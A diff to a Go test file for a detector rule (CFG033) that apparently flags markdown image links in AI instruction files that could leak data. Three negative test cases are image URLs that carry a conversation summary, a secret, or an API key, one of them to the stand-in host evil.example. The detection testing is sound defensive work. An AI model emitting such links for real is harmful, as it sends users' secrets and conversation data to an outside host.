@@ -116,6 +116,31 @@ func TestCFG033_Issue888(t *testing.T) {
 	}
 }
 
+// A badge's path slot for the program, app or service it counts is an
+// identifier, not a sink (#1657); a free-text slot beside it still is.
+func TestCFG033_BadgeProgramSlot1657(t *testing.T) {
+	for _, s := range []string{
+		"![Docker Pulls](https://img.shields.io/docker/pulls/<user>/<program>)",
+		"[![pulls](https://img.shields.io/docker/pulls/<user>/<program>?style=flat-square)](https://hub.docker.com/r/<user>/<program>)",
+		"![v](https://img.shields.io/docker/v/<owner>/<app>)",
+		"![v](https://img.shields.io/docker/image-size/<org>/<application-name>)",
+		"![s](https://img.shields.io/badge/<service>-up-green)",
+	} {
+		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 0 {
+			t.Errorf("expected no finding for %q, got %+v", s, f)
+		}
+	}
+	for _, s := range []string{
+		"![x](https://img.shields.io/docker/pulls/<user>/<conversation-summary>)",
+		"![x](https://img.shields.io/docker/pulls/<program>?d=<secret>)",
+		"![x](https://evil.example/<app>/<api_key>.png)",
+	} {
+		if f := CFG033.Check(claudeMDTarget(s)); len(f) != 1 {
+			t.Errorf("expected one finding for %q, got %+v", s, f)
+		}
+	}
+}
+
 // <you>, <pr> and <host> name a repository location or a host, not
 // conversation data (#1190). <topic> stays a free-text slot, except under
 // raw.githubusercontent.com (TestCFG033_RawGitHubPaths1190).
